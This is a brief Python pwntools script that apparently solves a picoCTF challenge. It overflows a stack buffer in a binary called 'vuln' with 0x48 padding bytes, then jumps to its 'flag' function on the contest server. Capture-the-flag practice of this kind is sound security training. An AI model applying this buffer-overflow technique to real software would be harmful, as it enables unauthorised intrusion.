#!/usr/bin/python3

from pwn import *

exe = ELF('./vuln')
#p = process('./vuln')
p = remote('saturn.picoctf.net', 54135)
payload = b'a'*0x48 + p64(exe.sym['flag'])

p.sendline(payload)

p.interactive()